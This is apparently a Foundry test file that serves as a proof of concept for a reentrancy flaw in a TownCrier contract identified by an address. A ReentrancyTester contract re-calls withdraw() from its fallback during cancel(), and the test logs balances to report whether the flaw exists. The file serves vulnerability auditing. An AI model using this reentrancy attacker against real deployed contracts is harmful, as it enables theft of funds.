// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x89c1b3807d4c67df034fffb62f3509561218d30b.sol";

contract ReentrancyTester {
    TownCrier public townCrier;
    uint64 public requestId;
    bool public reentered;
    bool public reenteredWithdraw;
    
    constructor(TownCrier _townCrier) payable {
        townCrier = _townCrier;
    }
    
    function request() external payable {
        bytes32[] memory requestData = new bytes32[](0);
        requestId = uint64(uint256(townCrier.request{value: msg.value}(
            0,
            address(this),
            bytes4(0),
            block.timestamp,
            requestData
        )));
    }
    
    function cancel() external {
        townCrier.cancel(requestId);
    }
    
    fallback() external payable {
        if (!reentered) {
            reentered = true;
            (bool success,) = address(townCrier).call(abi.encodeWithSignature("withdraw()"));
            reenteredWithdraw = success;
        }
    }
}

contract TownCrierReentrancyTest is Test {
    TownCrier public townCrier;
    ReentrancyTester public tester;
    uint constant MIN_FEE = 1 ether;
    address SGX_ADDRESS = address(0x1234); // Placeholder for SGX address
    
    function setUp() public {
        townCrier = new TownCrier();
        tester = new ReentrancyTester{value: 2 * MIN_FEE}(townCrier);
        
        vm.store(address(townCrier), bytes32(uint(0)), bytes32(abi.encode(SGX_ADDRESS)));
    }
    
    function testReentrancyVulnerability() public {
        tester.request{value: MIN_FEE}();
        
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 tcBalanceBefore = address(townCrier).balance;
        uint256 testerBalanceBefore = address(tester).balance;
        console.log("TownCrier ETH balance before:", tcBalanceBefore);
        console.log("Tester ETH balance before:", testerBalanceBefore);
        
        uint256 cancellationFee = townCrier.CANCELLATION_FEE();
        console.log("Cancellation fee:", cancellationFee);
        
        console.log("--- Trigger Cancellation ---");
        tester.cancel();
        
        console.log("--- AFTER-Trigger Balances ---");
        uint256 tcBalanceAfter = address(townCrier).balance;
        uint256 testerBalanceAfter = address(tester).balance;
        console.log("TownCrier ETH balance after:", tcBalanceAfter);
        console.log("Tester ETH balance after:", testerBalanceAfter);
        
        uint256 expectedTcBalance = tcBalanceBefore - (MIN_FEE - cancellationFee);
        uint256 expectedTesterBalance = testerBalanceBefore + (MIN_FEE - cancellationFee);
        
        bool reentrancyOccurred = tester.reenteredWithdraw();
        bool balanceAnomaly = (tcBalanceAfter != expectedTcBalance) || 
                              (testerBalanceAfter != expectedTesterBalance);
        
        console.log("Reentrancy occurred?", reentrancyOccurred ? "YES" : "NO");
        console.log("Balance anomaly?", balanceAnomaly ? "YES" : "NO");
        
        if (reentrancyOccurred) {
            console.log("Vulnerability Exists: Re-entrant call succeeded during cancellation");
        } else if (balanceAnomaly) {
            console.log("Vulnerability Exists: Unexpected balance changes detected");
        } else {
            console.log("Vulnerability not Exist: No evidence of exploitation found");
        }
        
        // Keep original assertion for test framework
        assertTrue(tester.reenteredWithdraw(), "Reentrant withdraw failed");
    }

    receive() external payable {}
}